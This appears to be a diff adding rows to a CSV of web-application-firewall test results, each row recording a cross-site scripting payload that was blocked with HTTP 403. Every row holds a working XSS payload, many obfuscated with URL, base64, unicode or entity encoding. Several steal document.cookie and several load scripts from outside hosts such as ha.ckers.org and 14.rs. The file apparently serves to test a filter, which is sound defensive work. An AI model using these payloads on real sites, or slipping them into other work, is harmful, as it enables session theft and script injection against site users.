+Blocked,<%73%63%72%69%70%74> %64 = %64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74(%22%64%69%76%22); %64%2e%61%70%70%65%6e%64%43%68%69%6c%64(%64%6f%63%75%6d%65%6e%74%2e%68%65%61%64%2e%63%6c%6f%6e%65%4e%6f%64%65(%74%72%75%65)); %61%6c%65%72%74(%64%2e%69%6e%6e%65%72%48%54%4d%4c%2e%6d%61%74%63%68(%22%63%6f%6f%6b%69%65 = '(%2e%2a%3f)'%22)[%31]); </%73%63%72%69%70%74>,403,3662
+Blocked,"<script> var xdr = new ActiveXObject(%22Microsoft.XMLHTTP%22);  xdr.open(%22get%22, %22/xssme2%3Fa=1%22, true); xdr.onreadystatechange = function() { try{   var c;   if (c=xdr.responseText.match(/document.cookie = '(.*%3F)'/) )    alert(c[1]); }catch(e){} };  xdr.send(); </script>",403,3662
+Blocked,"<iframe id=%22ifra%22 src=%22/%22></iframe> <script>ifr = document.getElementById('ifra'); ifr.contentDocument.write(%22<scr%22 %2b %22ipt>top.foo = Object.defineProperty</scr%22 %2b %22ipt>%22); foo(window, 'Safe', {value:{}}); foo(Safe, 'get', {value:function() {    return document.cookie }}); alert(Safe.get());</script>",403,3662
+Blocked,"<script>alert(document.head.innerHTML.substr(146,20));</script>",403,3662
+Blocked,<script>alert(document.head.childNodes[3].text)</script>,403,3662
+Blocked,"<script>var request = new XMLHttpRequest();request.open('GET', 'http://html5sec.org/xssme2', false);request.send(null);if (request.status == 200){alert(request.responseText.substr(150,41));}</script>",403,3662
+Blocked,"<script>Object.defineProperty(window, 'Safe', {value:{}});Object.defineProperty(Safe, 'get', {value:function() {return document.cookie}});alert(Safe.get())</script>",403,3662
+Blocked,"<script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%22)};document.body.appendChild(x);</script>",403,3662
+Blocked,"<script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>Object.defineProperty(parent,'Safe',{value:{}});Object.defineProperty(parent.Safe,'get',{value:function(){return top.document.cookie}});alert(parent.Safe.get())<\/script>%22)};document.body.appendChild(x);</script>",403,3662
+Blocked,"<script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B'(.*)'/gi); alert(RegExp.%241); } } xmlHttp.send(null); }; </script>",403,3662
+Blocked,"<script> document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());} document.getElementById(%22safe123%22).click({'type':'click','isTrusted':true}); </script>",403,3662
+Blocked,<script> var+MouseEvent=function+MouseEvent(){}; MouseEvent=MouseEvent var+test=new+MouseEvent(); test.isTrusted=true; test.type='click';  document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());} document.getElementById(%22safe123%22).click(test); </script>,403,3662
+Blocked,"<script>  (function (o) {   function exploit(x) {    if (x !== null)     alert('User cookie is ' %2B x);    else     console.log('fail');   }      o.onclick = function (e) {    e.__defineGetter__('isTrusted', function () { return true; });    exploit(Safe.get());   };      var e = document.createEvent('MouseEvent');   e.initEvent('click', true, true);   o.dispatchEvent(e);  })(document.getElementById('safe123')); </script>",403,3662
+Blocked,"<iframe src=/ onload=eval(unescape(this.name.replace(/\/g,null))) name=fff%253Dnew%2520this.contentWindow.window.XMLHttpRequest%2528%2529%253Bfff.open%2528%2522GET%2522%252C%2522xssme2%2522%2529%253Bfff.onreadystatechange%253Dfunction%2528%2529%257Bif%2520%2528fff.readyState%253D%253D4%2520%2526%2526%2520fff.status%253D%253D200%2529%257Balert%2528fff.responseText%2529%253B%257D%257D%253Bfff.send%2528%2529%253B></iframe>",403,3662
+Blocked,"<script>     function b() { return Safe.get(); } alert(b({type:String.fromCharCode(99,108,105,99,107),isTrusted:true})); </script> ",403,3662
+Blocked,<img src=http://www.google.fr/images/srpr/logo3w.png onload=alert(this.ownerDocument.cookie) width=0 height= 0 /> #,403,3662
+Blocked,"<script>  function foo(elem, doc, text) {   elem.onclick = function (e) {    e.__defineGetter__(text[0], function () { return true })    alert(Safe.get());   };      var event = doc.createEvent(text[1]);   event.initEvent(text[2], true, true);   elem.dispatchEvent(event);  } </script> <img src=http://www.google.fr/images/srpr/logo3w.png onload=foo(this,this.ownerDocument,this.name.split(/,/)) name=isTrusted,MouseEvent,click width=0 height=0 /> # ",403,3662
+Blocked,<SCRIPT+FOR=document+EVENT=onreadystatechange>MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;getElementById(%22safe123%22).click=function()+{alert(Safe.get());};getElementById(%22safe123%22).click(test);</SCRIPT>#,403,3662
+Blocked,"<script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B'(.*)'/gi); alert(RegExp.%241); } } xmlHttp.send(null); }; </script>#",403,3662
+Blocked,<video+onerror='javascript:MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());};document.getElementById(%22safe123%22).click(test);'><source>%23,403,3662
+Blocked,<script for=document event=onreadystatechange>getElementById('safe123').click()</script>,403,3662
+Blocked,<script> var+x+=+showModelessDialog+(this); alert(x.document.cookie); </script>,403,3662
+Blocked,"<script> location.href = 'data:text/html;base64,PHNjcmlwdD54PW5ldyBYTUxIdHRwUmVxdWVzdCgpO3gub3BlbigiR0VUIiwiaHR0cDovL3hzc21lLmh0bWw1c2VjLm9yZy94c3NtZTIvIix0cnVlKTt4Lm9ubG9hZD1mdW5jdGlvbigpIHsgYWxlcnQoeC5yZXNwb25zZVRleHQubWF0Y2goL2RvY3VtZW50LmNvb2tpZSA9ICcoLio/KScvKVsxXSl9O3guc2VuZChudWxsKTs8L3NjcmlwdD4='; </script>",403,3662
+Blocked,"<iframe src=%22404%22 onload=%22frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>",403,3662
+Blocked,"<iframe src=%22404%22 onload=%22content.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>",403,3662
+Blocked,"<iframe src=%22404%22 onload=%22self.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>",403,3662
+Blocked,"<iframe src=%22404%22 onload=%22top.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>",403,3662
+Blocked,"<script>var x = safe123.onclick;safe123.onclick = function(event) {var f = false;var o = { isTrusted: true };var a = [event, o, event];var get;event.__defineGetter__('type', function() {get = arguments.callee.caller.arguments.callee;return 'click';});var _alert = alert;alert = function() { alert = _alert };x.apply(null, a);(function() {arguments.__defineGetter__('0', function() { return a.pop(); });alert(get());})();};safe123.click();</script>#",403,3662
+Blocked,"<iframe onload=%22write('<script>'%2Blocation.hash.substr(1)%2B'</script>')%22></iframe>#var xhr = new XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();",403,3662
+Blocked,<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>,403,3662
+Blocked,<textarea id=ta onfocus=console.dir(event.currentTarget.ownerDocument.location.href=%26quot;javascript:\%26quot;%26lt;script%26gt;var%2520xhr%2520%253D%2520new%2520XMLHttpRequest()%253Bxhr.open('GET'%252C%2520'http%253A%252F%252Fhtml5sec.org%252Fxssme2'%252C%2520true)%253Bxhr.onload%2520%253D%2520function()%2520%257B%2520alert(xhr.responseText.match(%252Fcookie%2520%253D%2520'(.*%253F)'%252F)%255B1%255D)%2520%257D%253Bxhr.send()%253B%26lt;\/script%26gt;\%26quot;%26quot;) autofocus></textarea>,403,3662
+Blocked,"<iframe onload=%22write('<script>'%2Blocation.hash.substr(1)%2B'</script>')%22></iframe>#var xhr = new XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();",403,3662
+Blocked,<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>,403,3662
+Blocked,"<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe id=iframe src=%22javascript:parent.x(window)%22><iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();",403,3662
+Blocked,<textarea id=ta onfocus=%22write('<script>alert(1)</script>')%22 autofocus></textarea>,403,3662
+Blocked,"<object data=%22data:text/html;base64,PHNjcmlwdD4gdmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOyB4aHIub3BlbignR0VUJywgJ2h0dHA6Ly94c3NtZS5odG1sNXNlYy5vcmcveHNzbWUyJywgdHJ1ZSk7IHhoci5vbmxvYWQgPSBmdW5jdGlvbigpIHsgYWxlcnQoeGhyLnJlc3BvbnNlVGV4dC5tYXRjaCgvY29va2llID0gJyguKj8pJy8pWzFdKSB9OyB4aHIuc2VuZCgpOyA8L3NjcmlwdD4=%22>",403,3662
+Blocked,"<script>function x(window) { eval(location.hash.substr(1)) }; open(%22javascript:opener.x(window)%22)</script>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();",403,3662
+Blocked,"%3Cscript%3Exhr=new%20ActiveXObject%28%22Msxml2.XMLHTTP%22%29;xhr.open%28%22GET%22,%22/xssme2%22,true%29;xhr.onreadystatechange=function%28%29{if%28xhr.readyState==4%26%26xhr.status==200%29{alert%28xhr.responseText.match%28/%27%28[^%27]%2b%29/%29[1]%29}};xhr.send%28%29;%3C/script%3E",403,3662
+Blocked,"<iframe src=`http://xssme.html5sec.org/?xss=<iframe onload=%22xhr=new XMLHttpRequest();xhr.open('GET','http://html5sec.org/xssme2',true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){alert(xhr.responseText.match(/'([^']%2b)/)[1])}};xhr.send();%22>`>",403,3662
+Blocked,"<a target=""x"" href=""xssme?xss=%3Cscript%3EaddEventListener%28%22DOMFrameContentLoaded%22,%20function%28e%29%20{e.stopPropagation%28%29;},%20true%29;%3C/script%3E%3Ciframe%20src=%22data:text/html,%253cscript%253eObject.defineProperty%28top,%20%27MyEvent%27,%20{value:%20Object,%20configurable:%20true}%29;function%20y%28%29%20{alert%28top.Safe.get%28%29%29;};event%20=%20new%20Object%28%29;event.type%20=%20%27click%27;event.isTrusted%20=%20true;y%28event%29;%253c/script%253e%22%3E%3C/iframe%3E",403,3662
+Blocked,"<a target=""x"" href=""xssme?xss=<script>var cl=Components;var fcc=String.fromCharCode;doc=cl.lookupMethod(top, fcc(100,111,99,117,109,101,110,116) )( );cl.lookupMethod(doc,fcc(119,114,105,116,101))(doc.location.hash)</script>#<iframe src=data:text/html;base64,PHNjcmlwdD5ldmFsKGF0b2IobmFtZSkpPC9zY3JpcHQ%2b name=ZG9jPUNvbXBvbmVudHMubG9va3VwTWV0aG9kKHRvcC50b3AsJ2RvY3VtZW50JykoKTt2YXIgZmlyZU9uVGhpcyA9ICBkb2MuZ2V0RWxlbWVudEJ5SWQoJ3NhZmUxMjMnKTt2YXIgZXZPYmogPSBkb2N1bWVudC5jcmVhdGVFdmVudCgnTW91c2VFdmVudHMnKTtldk9iai5pbml0TW91c2VFdmVudCggJ2NsaWNrJywgdHJ1ZSwgdHJ1ZSwgd2luZG93LCAxLCAxMiwgMzQ1LCA3LCAyMjAsIGZhbHNlLCBmYWxzZSwgdHJ1ZSwgZmFsc2UsIDAsIG51bGwgKTtldk9iai5fX2RlZmluZUdldHRlcl9fKCdpc1RydXN0ZWQnLGZ1bmN0aW9uKCl7cmV0dXJuIHRydWV9KTtmdW5jdGlvbiB4eChjKXtyZXR1cm4gdG9wLlNhZmUuZ2V0KCl9O2FsZXJ0KHh4KGV2T2JqKSk></iframe>",403,3662
+Blocked,"<a target=""x"" href=""xssme?xss=<script>find('cookie'); var doc = getSelection().getRangeAt(0).startContainer.ownerDocument; console.log(doc); var xpe = new XPathEvaluator(); var nsResolver = xpe.createNSResolver(doc); var result = xpe.evaluate('//script/text()', doc, nsResolver, 0, null); alert(result.iterateNext().data.match(/cookie = '(.*?)'/)[1])</script>",403,3662
+Blocked,"<a target=""x"" href=""xssme?xss=<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe src=%22javascript:parent.x(window);%22></iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', '.', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();",403,3662
+Blocked,"Garethy Salty Method!<script>alert(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(this,'window')(),'document')(), 'getElementsByTagName')('html')[0],'innerHTML')().match(/d.*'/));</script>",403,3662
+Blocked,<div onmouseover='alert&lpar;1&rpar;'>DIV</div>,403,3662
+Blocked,"<iframe style=""position:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"">",403,3662
+Blocked,"<embed src=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf""> ?",403,3662
+Blocked,"<object data=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">?",403,3662
+Blocked,"<var onmouseover=""prompt(1)"">On Mouse Over</var>?",403,3662
+Blocked,"<img src=""/"" =_="" title=""onerror='prompt(1)'"">",403,3662
+Blocked,"<script src=""data:text/javascript,alert(1)""></script>",403,3662
+Blocked,<iframe/src \/\/onload = prompt(1),403,3662
+Blocked,<iframe/onreadystatechange=alert(1),403,3662
+Blocked,<svg/onload=alert(1),403,3662
+Blocked,<input value=<><iframe/src=javascript:confirm(1),403,3662
+Blocked,"<input type=""text"" value=``<div/onmouseover='alert(1)'>X</div>",403,3662
+Blocked,http://www.<script>alert(1)</script .com,403,3662
+Blocked,<svg><script ?>alert(1),403,3662
+Blocked,<iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>,403,3662
+Blocked,<img src=`xx:xx`onerror=alert(1)>,403,3662
+Blocked,"<object type=""text/x-scriptlet"" data=""http://jsfiddle.net/XLE63/ ""></object>",403,3662
+Blocked,"<meta http-equiv=""refresh"" content=""0;javascript&colon;alert(1)""/>?",403,3662
+Blocked,"<math><a xlink:href=""//jsfiddle.net/t846h/"">click",403,3662
+Blocked,"<embed code=""http://businessinfo.co.uk/labs/xss/xss.swf"" allowscriptaccess=always>?",403,3662
+Blocked,"<a href=""data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>"">X</a",403,3662
+Blocked,<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>,403,3662
+Blocked,<script>~'\u0061' ;  \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073.  \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+,403,3662
+Blocked,"<script/src=""data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')""></script a=\u0061 & /=%2F",403,3662
+Blocked,"<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script ????????????",403,3662
+Blocked,<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>,403,3662
+Blocked,<script>+-+-1-+-+alert(1)</script>,403,3662
+Blocked,<body/onload=&lt;!--&gt;&#10alert(1)>,403,3662
+Blocked,<script itworksinallbrowsers>/*<script* */alert(1)</script ?,403,3662
+Blocked,<img src ?itworksonchrome?\/onerror = alert(1)???,403,3662
+Blocked,<svg><script>//&NewLine;confirm(1);</script </svg>,403,3662
+Blocked,<svg><script onlypossibleinopera:-)> alert(1),403,3662
+Blocked,<script x> alert(1) </script 1=2,403,3662
+Blocked,"<div/onmouseover='alert(1)'> style=""x:"">",403,3662
+Blocked,<--`<img/src=` onerror=alert(1)> --!>,403,3662
+Blocked,"<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script> ?",403,3662
+Blocked,"<div  style=""position:absolute;top:0;left:0;width:100%;height:100%""  onmouseover=""prompt(1)"" onclick=""alert(1)"">x</button>?",403,3662
+Blocked,"""><img src=x onerror=window.open('https://www.google.com/');>",403,3662
+Blocked,<form><button formaction=javascript&colon;alert(1)>CLICKME,403,3662
+Blocked,"<math><a xlink:href=""//jsfiddle.net/t846h/"">click",403,3662
+Blocked,"<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>?",403,3662
+Blocked,"<iframe  src=""data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E""></iframe>",403,3662
+Blocked,"<a  href=""data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203"">Click  Me</a>",403,3662
+Blocked,"""><img src=x onerror=prompt(1);>",403,3662
+Blocked,<SCRIPT>alert('XSS');</SCRIPT>,403,3662
+Blocked,<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>,403,3662
+Blocked,"<IMG SRC=""javascript:alert('XSS');"">",403,3662
+Blocked,<IMG SRC=javascript:alert('XSS')>,403,3662
+Blocked,<IMG SRC=JaVaScRiPt:alert('XSS')>,403,3662
+Blocked,<IMG SRC=javascript:alert(&quot;XSS&quot;)>,403,3662
+Blocked,"<IMG SRC=`javascript:alert(""RSnake says, 'XSS'"")`>",403,3662
+Blocked,"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",403,3662
+Blocked,"<SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",403,3662
+Blocked,<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>,403,3662
+Blocked,"<IMG SRC=""javascript:alert('XSS')""",403,3662
+Blocked,<SCRIPT>a=/XSS/,403,3662
+Blocked,"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">",403,3662
+Blocked,"<BODY BACKGROUND=""javascript:alert('XSS')"">",403,3662
+Blocked,<BODY ONLOAD=alert('XSS')>,403,3662
+Blocked,"<IMG DYNSRC=""javascript:alert('XSS')"">",403,3662
+Blocked,"<IMG LOWSRC=""javascript:alert('XSS')"">",403,3662
+Blocked,"<BGSOUND SRC=""javascript:alert('XSS');"">",403,3662
+Blocked,"<LAYER SRC=""http://ha.ckers.org/scriptlet.html""></LAYER>",403,3662
+Blocked,"<LINK REL=""stylesheet"" HREF=""javascript:alert('XSS');"">",403,3662
+Blocked,"<LINK REL=""stylesheet"" HREF=""http://ha.ckers.org/xss.css"">",403,3662
+Blocked,<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>,403,3662
+Blocked,"<META HTTP-EQUIV=""Link"" Content=""<http://ha.ckers.org/xss.css>; REL=stylesheet"">",403,3662
+Blocked,"<STYLE>BODY{-moz-binding:url(""http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE>",403,3662
+Blocked,"<IMG SRC='vbscript:msgbox(""XSS"")'>",403,3662
+Blocked,"<IMG SRC=""mocha:[code]"">",403,3662
+Blocked,"<IMG SRC=""livescript:[code]"">",403,3662
+Blocked,"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:alert('XSS');"">",403,3662
+Blocked,"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"">",403,3662
+Blocked,"<META HTTP-EQUIV=""Link"" Content=""<javascript:alert('XSS')>; REL=stylesheet"">",403,3662
+Blocked,"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:alert('XSS');"">",403,3662
+Blocked,"<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>",403,3662
+Blocked,"<FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET>",403,3662
+Blocked,"<TABLE BACKGROUND=""javascript:alert('XSS')"">",403,3662
+Blocked,"<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">",403,3662
+Blocked,"<DIV STYLE=""width: expression(alert('XSS'));"">",403,3662
+Blocked,"<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>",403,3662
+Blocked,"<IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">",403,3662
+Blocked,"<XSS STYLE=""xss:expression(alert('XSS'))"">",403,3662
+Blocked,"<STYLE TYPE=""text/javascript"">alert('XSS');</STYLE>",403,3662
+Blocked,"<STYLE>.XSS{background-image:url(""javascript:alert('XSS')"");}</STYLE><A CLASS=XSS></A>",403,3662
+Blocked,"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",403,3662
+Blocked,"<BASE HREF=""javascript:alert('XSS');//"">",403,3662
+Blocked,"<OBJECT TYPE=""text/x-scriptlet"" DATA=""http://ha.ckers.org/scriptlet.html""></OBJECT>",403,3662
+Blocked,<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>,403,3662
+Blocked,"getURL(""javascript:alert('XSS')"")",403,3662
+Blocked,"<XML SRC=""http://ha.ckers.org/xsstest.xml"" ID=I></XML>",403,3662
+Blocked,<HTML><BODY>,403,3662
+Blocked,"<SCRIPT SRC=""http://ha.ckers.org/xss.jpg""></SCRIPT>",403,3662
+Blocked,"<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;"">",403,3662
+Blocked,"<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",403,3662
+Blocked,"<SCRIPT a="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",403,3662
+Blocked,"<SCRIPT a="">"" '' SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",403,3662
+Blocked,"<SCRIPT ""a='>'"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",403,3662
+Blocked,"<SCRIPT a=`>` SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",403,3662
+Blocked,"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",403,3662
+Blocked,<svg%0Aonload=%09((pro\u006dpt))()//,403,3662
+Blocked,<sCriPt x>(((confirm)))``</scRipt x>,403,3662
+Blocked,"<w=""/x=""y>""/OndbLcLick=`<`[confir\u006d``]>z",403,3662
+Blocked,<deTAiLs/open/oNtoGGle=confirm()>,403,3662
+Blocked,"<scRiPt y=""><"">/*<sCRipt* */prompt()</script",403,3662
+Blocked,"<A href=""javascript%26colon;confirm()"">click",403,3662
+Blocked,<sVg oNloaD=write()>,403,3662
+Blocked,"<sCrIpt/""<a""/srC=data:="".<a,[8].some(confirm)>",403,3662
+Blocked,"<svG/x="">""/oNloaD=confirm()//",403,3662
+Blocked,<--`<iMG/srC=` onerror=confirm``> --!>,403,3662
+Blocked,"<SVg </onlOad =""1> (_=prompt,_(1)) """">",403,3662
+Blocked,<!--><scRipT src=//14.rs>,403,3662
+Blocked,<sCriPt/src=//14.rs?,403,3662
+Blocked,"<sCRIpt x="">"" src=//15.rs></script>",403,3662
+Blocked,<D3/OnMouSEenTer=[2].find(confirm)>z,403,3662
+Blocked,"<D3""<""/OncLick=""1>[confirm``]""<"">z",403,3662
+Blocked,<D3/OnpOinTeReENter=confirm``>click here,403,3662
+Blocked,"<!'/*""/*/'/*/""/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>",403,3662
+Blocked,<Z oncut=alert()>x,403,3662
+Blocked,<iFrAMe/src \/\/onload = prompt(1),403,3662
+Blocked,"<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>",403,3662
+Blocked,"<div id=""1""><form id=""test""></form><button form=""test"" formaction=""javascript:alert(1)"">X</button>//[""'`-->]]>]</div><div id=""2""><meta charset=""x-imap4-modified-utf7"">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi//[""'`-->]]>]</div><div id=""3""><meta charset=""x-imap4-modified-utf7"">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>//[""'`-->]]>]</div><div id=""4"">0?<script>Worker(""#"").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts('data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk'))//[""'`-->]]>]</div><div id=""5""><script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(5)',384,null,'rsa-dual-use')</script>//[""'`-->]]>]</div><div id=""6""><script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>//[""'`-->]]>]</div><div id=""7""><input onfocus=alert(7) autofocus>//[""'`-->]]>]</div><div id=""8""><input onblur=alert(8) autofocus><input autofocus>//[""'`-->]]>]</div><div id=""9""><a style=""-o-link:'javascript:alert(9)';-o-link-source:current"">X</a>//[""'`-->]]>]</div><div id=""10""><video poster=javascript:alert(10)//></video>//[""'`-->]]>]</div><div id=""11""><svg xmlns=""http://www.w3.org/2000/svg""><g onload=""javascript:alert(11)""></g></svg>//[""'`-->]]>]</div><div id=""12""><body onscroll=alert(12)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>//[""'`-->]]>]</div><div id=""13""><x repeat=""template"" repeat-start=""999999"">0<y repeat=""template"" repeat-start=""999999"">1</y></x>//[""'`-->]]>]</div><div id=""14""><input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>//[""'`-->]]>]</div><div id=""15""><script>({0:#0=alert/#0#/#0#(0)})</script>//[""'`-->]]>]</div><div id=""16"">X<x style=`behavior:url(#default#time2)` onbegin=`alert(16)` >//[""'`-->]]>]</div><div id=""17""><?xml-stylesheet href=""javascript:alert(17)""?><root/>//[""'`-->]]>]</div><div id=""18""><script xmlns=""http://www.w3.org/1999/xhtml"">&#x61;l&#x65;rt&#40;1)</script>//[""'`-->]]>]</div><div id=""19""><meta charset=""x-mac-farsi"">¼script ¾alert(19)//¼/script ¾//[""'`-->]]>]</div><div id=""20""><script>ReferenceError.prototype.__defineGetter__('name', function(){alert(20)}),x</script>//[""'`-->]]>]</div><div id=""21""><script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(21)')()</script>//[""'`-->]]>]</div><div id=""22""><input onblur=focus() autofocus><input>//[""'`-->]]>]</div><div id=""23""><form id=test onforminput=alert(23)><input></form><button form=test onformchange=alert(2)>X</button>//[""'`-->]]>]</div><div id=""24"">1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=alert(24)&gt;`>//[""'`-->]]>]</div><div id=""25""><script src=""#"">{alert(25)}</script>;1//[""'`-->]]>]</div><div id=""26"">+ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),alert(RegExp.input);//[""'`-->]]>]</div><div id=""27""><style>p[foo=bar{}*{-o-link:'javascript:alert(27)'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>//[""'`-->]]>]</div>",403,3662
